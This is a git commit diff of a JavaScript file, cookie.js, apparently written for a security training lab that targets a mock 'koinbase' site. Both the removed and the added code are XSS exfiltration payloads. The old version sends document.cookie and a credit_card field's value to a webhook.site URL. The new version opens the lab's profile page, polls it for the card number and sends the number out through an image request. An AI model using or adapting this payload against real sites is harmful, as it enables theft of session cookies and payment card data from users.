af6e10005b171e3e00b112155171942d8aa5f899
alakinnn <hoang2504.rmit@gmail.com>
2025-06-19 20:20:22 +0700

    daf

--- cookie.js
+++ cookie.js
@@ -1,10 +1,13 @@
-// Send cookies
-fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?c=' + encodeURIComponent(document.cookie));
+const win = window.open("https://koinbase.cyberjutsu-lab.tech/profile.php", "_blank");
 
-// Wait for DOM to load before accessing elements
-window.onload = () => {
-  const cc = document.getElementById('credit_card');
-  if (cc) {
-    fetch('https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f/log?cc=' + encodeURIComponent(cc.value));
+const interval = setInterval(() => {
+  try {
+    const cc = win.document.querySelector('#credit_card')?.value;
+    if (cc) {
+      clearInterval(interval);
+      new Image().src = "https://webhook.site/bc3582e0-6295-481e-a7f2-b8a7703b616f?cc=" + encodeURIComponent(cc);
+    }
+  } catch (e) {
+    // cross-origin access error, wait and retry
   }
-};
+}, 1000);
